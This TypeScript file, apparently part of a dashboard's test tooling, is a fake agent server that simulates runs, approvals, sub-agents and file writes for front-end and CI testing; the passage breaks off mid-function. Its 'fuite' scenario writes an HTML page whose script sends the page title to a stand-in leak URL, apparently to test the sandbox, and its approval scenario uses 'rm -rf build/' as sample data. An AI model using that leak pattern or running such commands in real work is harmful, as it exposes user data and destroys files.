/**
 * Fake Hermes: replays a probe recording (fixtures/hermes-<version>/) on two Hono apps,
 * the API server and the dashboard, and simulates runs (SSE events with seq and resume).
 * Used for front-end development and CI, without Hermes nor an AI provider key.
 * `breaks` simulates an incompatible Hermes release.
 *
 * Run scenarios, chosen by words in the run input:
 * - default: run.started, two message.delta, tool.started, tool.completed, run.completed
 * - "approval": stops on approval.request until POST /v1/runs/{id}/approval. Format of Hermes 0.23 with its gateway
 *   session authority by default (`prompt_id`, `execution_generation`, `approval.settled`, exact answer body, status with
 *   `execution_generation` and `pending_controls`); `controls: 'legacy'` = API server without authority (`request_id`,
 *   `approval.responded`, body `{choice}`)
 * - steer (POST /v1/runs/{id}/steer): taken while the run is `running` (else 409), `run.steered` + a user line
 *   `display_kind: "steer"`; with "perdu" in the run's message never delivered, back as `pending_steer` at the end
 * - "secours": the run is served by another model than the one asked (`runtime.model = fake/model-fallback`)
 * - "question": the agent asks a question (clarify.request, 3 choices; "multi": several may be picked) until
 *   POST /v1/runs/{id}/clarify; the run stays `running`, the question is in `pending_controls`; the answer is quoted in
 *   the final text. Gateway session authority only: with `controls: 'legacy'` the route answers 409 not_found
 * - "echec": tool.failed instead of tool.completed
 * - "lent": one event every 500 ms for 10 s (resume tests by hand)
 * - "panne": the run ends in `failed` (run.failed, no usage)
 * - "roman": a long answer, 40 paragraphs streamed one every 120 ms (300 ms with "lent"); with "rapide",
 *   240 paragraphs, 6 at once every 30 ms; the final answer is the streamed text
 * - "cher": large token counts in `usage` (k / M formats)
 * Completed runs carry `usage`, `runtime` and `updated_at`; each one adds 0.0123 $ to its session's
 * `estimated_cost_usd` (null before). `GET /_fake/runs/last` (no token) = model options and input of the last run.
 * Cron jobs: see crons.ts (in-memory store, scenarios "bloque" and "long" in the job prompt).
 * Skills: see skills.ts (in-memory list, hub, background actions; "lent" in a hub search delays it).
 * Profiles: see profiles.ts; kanban: see kanban.ts (workers, dispatch, terminate).
 * - "delegue": two sub-agents (subagent.start / subagent.complete), the second a child of the first; the
 *   delegate_task call and its result (`{results: [...]}`) are stored in the messages like Hermes does
 * - "artefact": writes rapport.html in the session folder (like "fichier") with a script that writes in the page and
 *   tries fetch('/x/setup'), then answers with a `::artefact <path>` line; "absent" too: a line for a missing page;
 *   "fuite": fuite.html instead, whose script navigates its frame to http://localhost:9/leak?d=… after 300 ms
 * - "modifie": a write_file call (<workspace>/files/modifie.md) then a V4A patch (Update of that file, Add of
 *   files/nouveau.md); calls and results stored in the messages like Hermes does, files written on disk
 * - "taches": two todo_list calls (the second with merge: true, 1.5 s later), each result = the full list
 *
 * - "fichier" (in the input): writes rapport.md in the session folder named by the framing block,
 *   when that path is under `filesRoot` (the dashboard's managed files root), then cites its path
 * Managed files (`/api/files*`): see files.ts, rooted at `filesRoot`.
 */
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { Hono } from 'hono';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { CronStore } from './crons.js';
import { KanbanStore } from './kanban.js';
import { ProfileStore } from './profiles.js';
import { ConfigStore } from './config.js';
import { FilesStore } from './files.js';
import { GitStore, type GitFakeOptions } from './git.js';
import { MemoryStore } from './memory.js';
import { PluginStore } from './plugins.js';
import { MonitorStore, type MonitorFakeOptions } from './monitor.js';
export { FAKE_SECRETS, OPENROUTER_MODELS } from './config.js';
export { FAKE_MEMORY_LIMITS, FAKE_MEMORY_SEED, fingerprint as memoryFingerprint } from './memory.js';
export { FAKE_PLUGIN_CATALOG } from './plugins.js';
import { SkillStore } from './skills.js';

/**
 * Recording the fake replays by default and the server tests rely on: the one made on a used
 * instance (a session, a cron, a provider key). Newer recordings come from an empty container
 * and are only checked for compatibility.
 */
export const REFERENCE_FIXTURES = 'hermes-0.23.0';
export const FAKE_API_KEY = 'fake-api-key-000000000000';
export const FAKE_DASH_TOKEN = 'fake-dashboard-token';

export interface Break {
  /** HTTP status to answer instead of the fixture (e.g. 404, 500). */
  status?: number;
  /** Replaces the fixture body (e.g. a renamed field). */
  body?: unknown;
}

export interface FakeOptions {
  fixturesDir: string;
  /** Git routes (`/api/fs/git-root`, `/api/git/*`): see git.ts. */
  git?: GitFakeOptions;
  /** Stats, logs and host metrics: see monitor.ts. */
  monitor?: MonitorFakeOptions;
  /** Delay of a plugin install in ms (default FAKE_PLUGIN_INSTALL_MS or 2000): see plugins.ts. */
  pluginInstallMs?: number;
  /** Keyed by "api GET /path" or "dash GET /path" (paths without the /p/<profile> prefix). */
  breaks?: Record<string, Break>;
  /** Hide entries of /v1/capabilities `endpoints` or dashboard OpenAPI routes ("METHOD /path"). */
  hide?: { capabilities?: string[]; openapi?: string[] };
  /** Multi-profile routing: /p/<profile>/... on the API server requires that profile's key. */
  profileKeys?: Record<string, string>;
  /** Events with seq < retainFrom are forgotten: an older resume first gets replay.truncated. */
  retainFrom?: number;
  /** Delay between simulated events, in ms (default 5; "lent" scenario: 500). */
  stepMs?: number;
  /** Step of simulated cron runs, in ms (default: stepMs). */
  cronStepMs?: number;
  /** Duration of a simulated skills action (install, uninstall, update), in ms (default: stepMs). */
  skillStepMs?: number;
  /** Step of a simulated gateway restart (3 steps), in ms (default: stepMs). */
  configStepMs?: number;
  /** Duration of a simulated kanban worker, in ms (default: stepMs). */
  kanbanStepMs?: number;
  /** Managed files root of the dashboard (`locked_root`), also where the fake agent writes (default: a temporary folder). */
  filesRoot?: string;
  /** Format of approvals: 'authority' (Hermes 0.23 gateway, default) or 'legacy' (API server without authority). */
  controls?: 'authority' | 'legacy';
  /** `hermes_home` announced by the dashboard's /api/status (default /opt/data). */
  hermesHome?: string;
  /** `terminal.backend` in GET /api/config (default: the recording's, `local`). */
  terminalBackend?: string;
  /** Delay before each managed files answer, in ms (slow Hermes). */
  filesDelayMs?: number;
  /**
   * `session.stats` on the dashboard WebSocket `/api/ws` (dashboard inside the gateway); default false = standalone
   * dashboard, the method answers -32601 like Hermes 0.23.
   */
  sessionStats?: boolean;
  /**
   * `llm.oneshot` on `/api/ws` (answers on a standalone dashboard too): `ok` (default) = a title made from the start of
   * the input, `no_model` = 5030 as without a provider key, `off` = -32601 (method absent).
   */
  oneshot?: 'ok' | 'off' | 'no_model';
  /** Kanban events WebSocket available (default true); false closes every connection with 1008. */
  kanbanWs?: boolean;
}

export interface LoggedRequest {
  via: Via;
  method: string;
  /** Path without the /p/<profile> prefix. */
  path: string;
  profile: string;
  authorization: string | undefined;
  query: Record<string, string>;
  headers: Record<string, string>;
  body: unknown;
}

/** Must match apps/server/src/cli/fixtures.ts (checked by a server test). */
export function fixtureName(method: string, path: string): string {
  return `${method.toUpperCase()}${path.replace(/[^A-Za-z0-9]+/g, '_')}.json`;
}

type Via = 'api' | 'dash';

function load(dir: string, via: Via, method: string, path: string): { status: number; body: unknown } | null {
  const file = join(dir, via, path === '/openapi.json' ? 'openapi.json' : fixtureName(method, path));
  if (!existsSync(file)) return null;
  const raw = JSON.parse(readFileSync(file, 'utf8'));
  return path === '/openapi.json' ? { status: 200, body: raw } : raw;
}

// ---------------------------------------------------------------- simulated runs

type Ev = Record<string, unknown> & { event: string };

interface SimRun {
  id: string;
  sessionId: string;
  input: string;
  /** "roman" scenario: the streamed text, also the final answer. */
  romanText?: string;
  instructions: string;
  createdAt: number;
  updatedAt: number;
  model: string | null;
  modelOptions: unknown;
  provider: string | null;
  status: string;
  output: string;
  usage: Record<string, number> | null;
  events: (Ev & { seq: number })[];
  listeners: Set<() => void>;
  approval: { resolve: (choice: string) => void; prompt: Record<string, unknown> } | null;
  clarify: { resolve: (answer: string) => void; prompt: Record<string, unknown> } | null;
  /** Answer given to the question of the run (quoted in the final text). */
  answer?: string;
  /** "perdu": a reorientation not given to the agent, sent back as `pending_steer` at the end. */
  pendingSteer?: string;
}

interface SimMessage {
  id: number;
  session_id: string;
  role: string;
  content: string | null;
  tool_calls: unknown;
  tool_name: string | null;
  timestamp: number;
  display_kind?: string;
}

const TERMINAL = new Set(['completed', 'failed', 'cancelled', 'interrupted']);
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

class Simulator {
  runs = new Map<string, SimRun>();
  messages = new Map<string, SimMessage[]>();
  /** Cumulated cost per session (estimated_cost_usd), absent = null. */
  costs = new Map<string, number>();
  lastRun: SimRun | null = null;
  /** Tests: session id → live session id reported by /messages (simulates a context compression). */
  liveAlias = new Map<string, string>();
  /** Tests: sessions born elsewhere (Telegram, cron…) added by POST /_fake/sessions. */
  extraSessions = new Map<string, { id: string; source: string | null; title: string | null; started_at: number; messages: { role: string; content: string }[] }>();
  /** Session titles set by PATCH /api/sessions/{id}. */
  titles = new Map<string, string>();
  /** Like Hermes 0.23 (unique index on sessions.title): the other session holding this title, if any. */
  titleHolder(title: string, except: string): string | undefined {
    for (const [id, t] of this.titles) if (t === title && id !== except) return id;
    for (const e of this.extraSessions.values()) if (e.title === title && e.id !== except) return e.id;
    return undefined;
  }
  /** POST /v1/runs received since start. */
  runsPosted = 0;
  /** Approval format, see FakeOptions.controls. */
  controls: 'authority' | 'legacy' = 'authority';
  private counter = 0;
  private msgId = 1000;

  constructor(private readonly stepMs: number, private readonly filesRoot: string) {}

  create(sessionId: string, input: string, instructions = '', model: string | null = null, modelOptions: unknown = null, provider: string | null = null): SimRun {
    this.counter += 1;
    const now = Date.now() / 1000;
    const run: SimRun = {
      id: `run_fake${String(this.counter).padStart(4, '0')}`,
      sessionId, input, instructions, createdAt: now, updatedAt: now, model, modelOptions, provider, status: 'queued', output: '', usage: null,
      events: [], listeners: new Set(), approval: null, clarify: null,
    };
    this.runs.set(run.id, run);
    this.lastRun = run;
    this.addMessage(sessionId, 'user', input);
    void this.play(run);
    return run;
  }

  addMessage(sessionId: string, role: string, content: string, extra: Partial<SimMessage> = {}) {
    const list = this.messages.get(sessionId) ?? [];
    this.msgId += 1;
    list.push({ id: this.msgId, session_id: sessionId, role, content, tool_calls: null, tool_name: null, timestamp: Date.now() / 1000, ...extra });
    this.messages.set(sessionId, list);
  }

  private push(run: SimRun, ev: Ev) {
    const seq = run.events.length;
    run.updatedAt = Date.now() / 1000;
    run.events.push({ ...ev, run_id: run.id, timestamp: Date.now() / 1000, seq });
    for (const l of run.listeners) l();
  }

  private async play(run: SimRun) {
    const slow = /lent/i.test(run.input);
    const step = slow ? 500 : this.stepMs;
    await sleep(step);
    // stopped before it started
    if (TERMINAL.has(run.status)) return;
    run.status = 'running';
    this.push(run, { event: 'run.started' });
    if (/roman/i.test(run.input)) {
      // long answer streamed paragraph by paragraph (thread following tests)
      // "rapide": 240 paragraphs, 6 at once every 30 ms (bursts taller than the follow threshold between two frames)
      const burst = /rapide/i.test(run.input) ? 6 : 1;
      const total = burst > 1 ? 240 : 40;
      for (let i = 0; i < total; i += burst) {
        await sleep(burst > 1 ? 30 : slow ? 300 : 120);
        const text = Array.from({ length: burst }, (_, k) => `Paragraphe ${i + k + 1} : une ligne de texte assez longue pour occuper la largeur du fil et le faire grandir.\n\n`).join('');
        this.push(run, { event: 'message.delta', delta: text });
        run.romanText = (run.romanText ?? '') + text;
      }
    } else if (slow) {
      for (let i = 0; i < 18; i++) {
        await sleep(step);
        this.push(run, { event: 'message.delta', delta: `${i + 1}… ` });
      }
    }
    if (/approval/i.test(run.input)) {
      if (TERMINAL.has(run.status)) return;
      run.status = 'waiting_for_approval';
      const authority = this.controls === 'authority';
      const question = { command: 'rm -rf build/', description: 'Supprimer le dossier build', choices: ['once', 'session', 'always', 'deny'] };
      const prompt = authority ? { kind: 'approval', prompt_id: 'apr_1', execution_generation: 1, ...question } : { request_id: 'apr_1', ...question };
      const choice = await new Promise<string>((resolve) => {
        run.approval = { resolve, prompt };
        this.push(run, { event: 'approval.request', ...prompt });
      });
      run.approval = null;
      // stopped while it waited: stays cancelled
      if (TERMINAL.has(run.status)) return;
      run.status = 'running';
      this.push(run, authority
        ? { event: 'approval.settled', prompt_id: 'apr_1', execution_generation: 1 }
        : { event: 'approval.responded', choice, request_id: 'apr_1', resolved: 1 });
      if (choice === 'deny') {
        await sleep(step);
        return this.finish(run, 'Commande refusée, je m’arrête là.');
      }
    }
    if (/question/i.test(run.input) && this.controls === 'authority') {
      const prompt = {
        kind: 'clarify', prompt_id: 'clr_1', execution_generation: 1, question: 'Quel magasin dois-je traiter ?',
        choices: ['Frouard', 'Houdemont', 'Les deux'], multi_select: /multi/i.test(run.input),
      };
      run.answer = await new Promise<string>((resolve) => {
        run.clarify = { resolve, prompt };
        this.push(run, { event: 'clarify.request', ...prompt });
      });
      run.clarify = null;
      if (TERMINAL.has(run.status)) return;
      this.push(run, { event: 'clarify.settled', prompt_id: 'clr_1', execution_generation: 1 });
      await sleep(step);
      return this.finish(run, `Vous avez choisi : ${run.answer}.`);
    }
    if (/panne/i.test(run.input)) {
      await sleep(step);
      this.push(run, { event: 'message.delta', delta: 'Je commence…' });
      await sleep(step);
      return this.fail(run, 'Provider error: model unavailable');
    }
    if (/roman/i.test(run.input)) return this.finish(run, run.romanText ?? '');
    if (/modifie/i.test(run.input)) return this.playModified(run, step);
    if (/fichier/i.test(run.input)) return this.playFile(run, step);
    if (/delegue/i.test(run.input)) return this.playDelegate(run, step);
    if (/t[aâ]ches/i.test(run.input)) return this.playTodos(run, step);
    if (/artefact/i.test(run.input)) return this.playArtifact(run, step);
    await sleep(step);
    this.push(run, { event: 'message.delta', delta: 'Je regarde ' });
    await sleep(step);
    this.push(run, { event: 'message.delta', delta: 'le dossier.' });
    await sleep(step);
    this.push(run, { event: 'tool.started', tool: 'terminal', preview: 'ls -la', call_id: 'call_1' });
    await sleep(step);
    if (/echec/i.test(run.input)) {
      this.push(run, { event: 'tool.failed', tool: 'terminal', duration: 0.2, error: true, preview: 'ls: permission denied', call_id: 'call_1' });
    } else {
      this.push(run, { event: 'tool.completed', tool: 'terminal', duration: 0.42, error: false, preview: 'AGENTS.md\nfiles\ninbox\nsessions', call_id: 'call_1' });
    }
    this.addMessage(run.sessionId, 'tool', 'AGENTS.md\nfiles\ninbox\nsessions', { tool_name: 'terminal' });
    await sleep(step);
    this.finish(run, 'Je regarde le dossier. Il contient `AGENTS.md`, `files`, `inbox` et `sessions`.');
  }

  private async playFile(run: SimRun, step: number) {
    const dir = /dans (\S+\/sessions\/[^/\s]+)\/\./.exec(run.instructions)?.[1] ?? '/workspace/sessions/inconnue';
    const path = `${dir}/rapport.md`;
    if (path.startsWith(`${this.filesRoot}/`)) {
      mkdirSync(path.slice(0, path.lastIndexOf('/')), { recursive: true });
      writeFileSync(path, '# Rapport\n\nFichier écrit par fake-hermes.\n\n| Magasin | Ventes |\n|---|---|\n| Frouard | 1 240 |\n| Houdemont | 980 |\n');
    }
    await sleep(step);
    this.push(run, { event: 'tool.started', tool: 'write_file', preview: path, call_id: 'call_1' });
    await sleep(step);
    this.push(run, { event: 'tool.completed', tool: 'write_file', duration: 0.05, error: false, preview: path, call_id: 'call_1' });
    this.addMessage(run.sessionId, 'tool', `Wrote ${path}`, { tool_name: 'write_file' });
    await sleep(step);
    this.finish(run, `Voilà le rapport : \`${path}\`. Il reprend les ventes des deux magasins.`);
  }

  /** "modifie" scenario: write_file then a V4A patch that updates that file and adds another one. */
  private async playModified(run: SimRun, step: number) {
    const dir = /dans (\S+)\/sessions\/[^/\s]+\/\./.exec(run.instructions)?.[1] ?? '/workspace';
    const first = `${dir}/files/modifie.md`;
    const added = `${dir}/files/nouveau.md`;
    const onDisk = first.startsWith(`${this.filesRoot}/`);
    const write = JSON.stringify({ path: first, content: '# Modifié\n\nPremière version.\n' });
    this.addMessage(run.sessionId, 'assistant', '', { tool_calls: [{ id: 'call_w1', type: 'function', function: { name: 'write_file', arguments: write } }] });
    this.push(run, { event: 'tool.started', tool: 'write_file', preview: first, call_id: 'call_w1' });
    if (onDisk) {
      mkdirSync(`${dir}/files`, { recursive: true });
      writeFileSync(first, '# Modifié\n\nPremière version.\n');
    }
    await sleep(step);
    this.addMessage(run.sessionId, 'tool', JSON.stringify({ bytes_written: 30, dirs_created: false }), { tool_name: 'write_file' });
    this.push(run, { event: 'tool.completed', tool: 'write_file', duration: 0.05, error: false, preview: first, call_id: 'call_w1' });
    const patch = [
      '*** Begin Patch',
      `*** Update File: ${first}`,
      '@@',
      ' # Modifié',
      '-Première version.',
      '+Deuxième version.',
      `***Add File: ${added}`,
      '+# Nouveau',
      '*** End Patch',
    ].join('\n');
    const args = JSON.stringify({ mode: 'patch', patch });
    this.addMessage(run.sessionId, 'assistant', '', { tool_calls: [{ id: 'call_p1', type: 'function', function: { name: 'patch', arguments: args } }] });
    this.push(run, { event: 'tool.started', tool: 'patch', preview: 'patch', call_id: 'call_p1' });
    if (onDisk) {
      writeFileSync(first, '# Modifié\n\nDeuxième version.\n');
      writeFileSync(added, '# Nouveau\n');
    }
    await sleep(step);
    this.addMessage(run.sessionId, 'tool', JSON.stringify({ success: true, files_modified: [first], files_created: [added] }), { tool_name: 'patch' });
    this.push(run, { event: 'tool.completed', tool: 'patch', duration: 0.08, error: false, preview: 'ok', call_id: 'call_p1' });
    await sleep(step);
    this.finish(run, 'J’ai modifié deux fichiers.');
  }

  /** "delegue" scenario: two sub-agents, the second one a child of the first. */
  private async playDelegate(run: SimRun, step: number) {
    const base = { task_count: 1, task_index: 0, model: 'fake/model-mini' };
    const args = JSON.stringify({ goal: 'Lire les ventes de Frouard', context: 'Fichier ventes.csv' });
    this.addMessage(run.sessionId, 'assistant', '', { tool_calls: [{ id: 'call_d1', type: 'function', function: { name: 'delegate_task', arguments: args } }] });
    this.push(run, { event: 'tool.started', tool: 'delegate_task', preview: 'Lire les ventes de Frouard', call_id: 'call_d1' });
    this.push(run, { event: 'subagent.start', ...base, subagent_id: 'sa_1', depth: 1, goal: 'Lire les ventes de Frouard', preview: 'Lire les ventes de Frouard' });
    await sleep(step);
    this.push(run, { event: 'subagent.start', ...base, subagent_id: 'sa_2', parent_id: 'sa_1', depth: 2, goal: 'Calculer le total par rayon' });
    await sleep(step * 2);
    this.push(run, {
      event: 'subagent.complete', ...base, subagent_id: 'sa_2', parent_id: 'sa_1', depth: 2, status: 'completed',
      summary: 'Total : 1 240 €.', duration_seconds: 2.4, cost_usd: 0.0031, input_tokens: 820, output_tokens: 64, tool_count: 1,
    });
    await sleep(step);
    this.push(run, {
      event: 'subagent.complete', ...base, subagent_id: 'sa_1', depth: 1, status: 'completed',
      summary: 'Ventes de Frouard lues.', duration_seconds: 4.1, cost_usd: 0.0123, input_tokens: 2100, output_tokens: 180, tool_count: 3,
    });
    // Hermes writes the tool result before the tool.completed event
    const result = JSON.stringify({
      results: [{ task_index: 0, status: 'completed', summary: 'Ventes de Frouard lues.', api_calls: 4, duration_seconds: 4.1, model: 'fake/model-mini', tokens: { input: 2100, output: 180 } }],
      total_duration_seconds: 4.2,
    });
    this.addMessage(run.sessionId, 'tool', result, { tool_name: 'delegate_task' });
    this.push(run, { event: 'tool.completed', tool: 'delegate_task', duration: 4.2, error: false, preview: result.slice(0, 500), call_id: 'call_d1' });
    await sleep(step);
    this.finish(run, 'Les deux sous-agents ont fini : 1 240 € de ventes à Frouard.');
  }

  /** "artefact" scenario: an HTML page with a script, shown in the thread by its `::artefact` line. */
  private async playArtifact(run: SimRun, step: number) {
    const dir = /dans (\S+\/sessions\/[^/\s]+)\/\./.exec(run.instructions)?.[1] ?? '/workspace/sessions/inconnue';
    const leak = /fuite/i.test(run.input);
    const path = `${dir}/${leak ? 'fuite' : 'rapport'}.html`;
    if (path.startsWith(`${this.filesRoot}/`) && leak) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Fuite</title></head>
<body><p id="state">avant</p><script>
setTimeout(() => { location.href = 'http://localhost:9/leak?d=' + encodeURIComponent(document.title); }, 300);
</script></body></html>
`);
    } else if (path.startsWith(`${this.filesRoot}/`)) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(path, `<!doctype html><html lang="fr"><head><meta charset="utf-8"><title>Rapport</title>
<style>body{font:15px system-ui,sans-serif;margin:1.5rem;color:#222}b{color:#c50}</style></head>
<body><h1>Ventes</h1><p id="js">sans script</p><p id="net">réseau : ?</p>
<script>
document.getElementById('js').textContent = 'Script exécuté : ' + (1240 + 980) + ' €';
fetch('/x/setup').then(() => { document.getElementById('net').textContent = 'réseau : ouvert'; },
  () => { document.getElementById('net').textContent = 'réseau : bloqué'; });
</script></body></html>
`);
    }
    await sleep(step);
    this.push(run, { event: 'tool.started', tool: 'write_file', preview: path, call_id: 'call_1' });
    await sleep(step);
    this.push(run, { event: 'tool.completed', tool: 'write_file', duration: 0.05, error: false, preview: path, call_id: 'call_1' });
    this.addMessage(run.sessionId, 'tool', `Wrote ${path}`, { tool_name: 'write_file' });
    await sleep(step);
    const missing = /absent/i.test(run.input) ? `\n\nEt l'ancienne version :\n::artefact ${dir}/ancien.html` : '';
    this.finish(run, `Voici la page des ventes :\n::artefact ${path}\nElle additionne les deux magasins.${missing}`);
  }

  /** "taches" scenario: the agent writes its task list, then updates it (merge) 1.5 s later. */
  private async playTodos(run: SimRun, step: number) {
    const write = async (n: number, args: object, todos: object[]) => {
      const id = `call_t${n}`;
      this.addMessage(run.sessionId, 'assistant', '', { tool_calls: [{ id, type: 'function', function: { name: 'todo_list', arguments: JSON.stringify(args) } }] });
      this.push(run, { event: 'tool.started', tool: 'todo_list', preview: `${todos.length} tâches`, call_id: id });
      await sleep(step);
      const result = JSON.stringify({ todos, revision: n, summary: `${todos.length} tâches` });
      this.addMessage(run.sessionId, 'tool', result, { tool_name: 'todo_list' });
      this.push(run, { event: 'tool.completed', tool: 'todo_list', duration: 0.01, error: false, preview: result.slice(0, 500), call_id: id });
    };
    const first = [
      { id: '1', content: 'Lire les ventes', status: 'in_progress' },
      { id: '2', content: 'Comparer les magasins', status: 'pending' },
      { id: '2a', content: 'Frouard contre Houdemont', status: 'pending', parent: '2' },
      { id: '3', content: 'Écrire le résumé', status: 'pending' },
    ];
    await sleep(step);
    await write(1, { todos: first }, first);
    await sleep(1500);
    const second = [
      { id: '1', content: 'Lire les ventes', status: 'completed' },
      { id: '2', content: 'Comparer les magasins', status: 'completed' },
      { id: '2a', content: 'Frouard contre Houdemont', status: 'cancelled', parent: '2' },
      { id: '3', content: 'Écrire le résumé', status: 'in_progress' },
    ];
    await write(2, { todos: second, merge: true }, second);
    await sleep(1500);
    this.finish(run, 'Le résumé est prêt : Frouard devant Houdemont.');
  }

  private finish(run: SimRun, output: string) {
    const big = /cher/i.test(run.input);
    const input = big ? 1_250_000 : 12_000;
    const output_tokens = big ? 5_200 : 800;
    run.usage = {
      input_tokens: input, output_tokens, total_tokens: input + output_tokens,
      cache_read_tokens: big ? 1_000_000 : 9_000, cache_write_tokens: big ? 200_000 : 500,
    };
    run.status = 'completed';
    run.output = output;
    // "tard": the cost is written 8 s after the end (Hermes counts costs from a background queue)
    const addCost = () => this.costs.set(run.sessionId, Math.round(((this.costs.get(run.sessionId) ?? 0) + 0.0123) * 1e6) / 1e6);
    if (/tard/i.test(run.input)) setTimeout(addCost, 8_000).unref?.();
    else addCost();
    this.addMessage(run.sessionId, 'assistant', output);
    this.push(run, { event: 'run.completed', output, usage: run.usage, runtime: this.runtime(run), ...(run.pendingSteer ? { pending_steer: run.pendingSteer } : {}) });
  }

  /** Like Hermes: taken only while the run is exactly `running`; "perdu" in the run's message: never delivered. */
  steer(run: SimRun, text: string): boolean {
    if (run.status !== 'running') return false;
    if (/perdu/i.test(run.input)) {
      run.pendingSteer = run.pendingSteer ? `${run.pendingSteer}\n${text}` : text;
      return true;
    }
    this.addMessage(run.sessionId, 'user', text, { display_kind: 'steer' });
    this.push(run, { event: 'run.steered', accepted: true });
    return true;
  }

  runtime(run: SimRun) {
    // "secours": the provider fell back to another model
    if (/secours/i.test(run.input)) return { provider: 'fake', model: 'fake/model-fallback' };
    return { provider: 'fake', model: run.model ?? 'fake/model-default' };
  }

  private fail(run: SimRun, error: string) {
    run.status = 'failed';
    this.push(run, { event: 'run.failed', error });
  }

  stop(run: SimRun) {
    if (TERMINAL.has(run.status)) return;
    run.status = 'cancelled';
    run.approval?.resolve('deny');
    run.clarify?.resolve('');
    this.push(run, { event: 'run.cancelled' });
  }

  /** SSE stream with Hermes framing: `id: <seq>` + `data: <json>`, resume after `lastSeq`. */
  stream(run: SimRun, lastSeq: number, retainFrom: number): Response {
    const enc = new TextEncoder();
    let cleanup = () => {};
    const body = new ReadableStream<Uint8Array>({
      start: (controller) => {
        let sent = lastSeq;
        let closed = false;
        const write = (s: string) => { if (!closed) controller.enqueue(enc.encode(s)); };
        const close = () => {
          if (closed) return;
          write(': stream closed\n\n');
          closed = true;
          run.listeners.delete(flush);
          controller.close();
        };
        const flush = () => {
          for (const ev of run.events) {
            if (ev.seq <= sent || ev.seq < retainFrom) continue;
            write(`id: ${ev.seq}\ndata: ${JSON.stringify(ev)}\n\n`);
            sent = ev.seq;
          }
          if (TERMINAL.has(run.status) && sent >= run.events.length - 1) close();
        };
        write(': open\n\n');
        if (retainFrom > 0 && lastSeq + 1 < retainFrom && run.events.length > 0) {
          write(`data: ${JSON.stringify({ event: 'replay.truncated', run_id: run.id, oldest_retained_seq: retainFrom, requested_seq: lastSeq })}\n\n`);
        }
        run.listeners.add(flush);
        cleanup = () => { closed = true; run.listeners.delete(flush); };
        flush();
      },
      cancel: () => cleanup(),
    });
    return new Response(body, { headers: { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' } });
  }
}

// ---------------------------------------------------------------- apps

interface Stores { crons: CronStore; skills: SkillStore; config: ConfigStore; profiles: ProfileStore; kanban: KanbanStore; files: FilesStore; git: GitStore; monitor: MonitorStore; memory: MemoryStore; plugins: PluginStore }

function makeApp(via: Via, opts: FakeOptions, sim: Simulator, stores: Stores, log: LoggedRequest[]): Hono {
  const { crons, skills, config, profiles, kanban } = stores;
  const app = new Hono();
  const deleted = new Set<string>();

  app.all('*', async (c) => {
    const method = c.req.method;
    let path = c.req.path;
    let profile = 'default';
    const m = via === 'api' ? /^\/p\/([^/]+)(\/.*)$/.exec(path) : null;
    if (m) {
      profile = decodeURIComponent(m[1]!);
      path = m[2]!;
    }
    // managed files read their own body (multipart for upload-stream): handled before the JSON parse, logged without body
    if (via === 'dash' && (path === '/api/files' || path.startsWith('/api/files/'))) {
      log.push({ via, method, path, profile, authorization: c.req.header('authorization'), query: c.req.query(), headers: Object.fromEntries(c.req.raw.headers), body: undefined });
      if (c.req.header('authorization') !== `Bearer ${FAKE_DASH_TOKEN}`) return c.json({ error: 'unauthorized' }, 401);
      const brk = opts.breaks?.[`dash ${method} ${path}`];
      if (brk?.status) return c.json(brk.body ?? { detail: 'broken by fake-hermes' }, brk.status as 404);
      if (brk && 'body' in brk) return c.json(brk.body as object);
      if (stores.files.delayMs) await sleep(stores.files.delayMs);
      const res = await stores.files.handle(method, path, c.req.raw, c.req.query());
      if (res) return res;
    }
    if (via === 'dash' && (path === '/api/fs/git-root' || path.startsWith('/api/git/'))) {
      log.push({ via, method, path, profile, authorization: c.req.header('authorization'), query: c.req.query(), headers: Object.fromEntries(c.req.raw.headers), body: undefined });
      if (c.req.header('authorization') !== `Bearer ${FAKE_DASH_TOKEN}`) return c.json({ error: 'unauthorized' }, 401);
      const brk = opts.breaks?.[`dash ${method} ${path}`];
      if (brk?.status) return c.json(brk.body ?? { detail: 'broken by fake-hermes' }, brk.status as 404);
      const res = await stores.git.handle(method, path, c.req.raw, c.req.query());
      if (res) return res;
    }
    let body: unknown;
    if (method !== 'GET' && method !== 'HEAD') body = await c.req.json().catch(() => undefined);
    log.push({
      via, method, path, profile, authorization: c.req.header('authorization'),
      query: c.req.query(), headers: Object.fromEntries(c.req.raw.headers), body,
    });

    // test route (Playwright runs cannot read the in-memory log): options of the last created run
    if (via === 'api' && method === 'GET' && path === '/_fake/runs/last') {
      const last = sim.lastRun;
      return c.json(last ? { run_id: last.id, model: last.model, model_options: last.modelOptions, provider: last.provider, input: last.input, instructions: last.instructions } : { run_id: null });
    }
    if (via === 'api' && method === 'GET' && path === '/_fake/runs/count') return c.json({ count: sim.runsPosted });
    if (method === 'GET' && path === '/_fake/git/calls') return c.json({ calls: stores.git.calls });
    if (method === 'GET' && path === '/_fake/monitor/calls') return c.json({ calls: stores.monitor.calls });
    // tests: the credential pool of a profile, keys in clear; POST seeds an env entry and an OAuth login
    if (via === 'api' && method === 'GET' && path === '/_fake/pool') return c.json({ entries: config.providers.poolOf(c.req.query('profile') ?? 'default') });
    if (via === 'api' && method === 'POST' && path === '/_fake/pool/seed') {
      config.providers.seedSamples(c.req.query('profile') ?? 'default');
      return c.json({ ok: true });
    }
    if (via === 'api' && method === 'POST' && path === '/_fake/sessions') {
      const b = (body ?? {}) as Record<string, unknown>;
      const id = typeof b.id === 'string' ? b.id : `fake_extra_${sim.extraSessions.size + 1}`;
      sim.extraSessions.set(id, {
        id, source: typeof b.source === 'string' ? b.source : null, title: typeof b.title === 'string' ? b.title : null,
        started_at: typeof b.started_at === 'number' ? b.started_at : Date.now() / 1000,
        messages: Array.isArray(b.messages)
          ? (b.messages as { role?: unknown; content?: unknown }[]).map((m) => ({ role: String(m.role ?? 'user'), content: String(m.content ?? '') }))
          : [],
      });
      return c.json({ id });
    }
    const titleMatch = /^\/_fake\/sessions\/([^/]+)\/title$/.exec(path);
    if (via === 'api' && method === 'GET' && titleMatch) return c.json({ title: sim.titles.get(decodeURIComponent(titleMatch[1]!)) ?? null });
    if (path !== '/health') {
      const token = via === 'dash' ? FAKE_DASH_TOKEN : profile === 'default' ? FAKE_API_KEY : opts.profileKeys?.[profile];
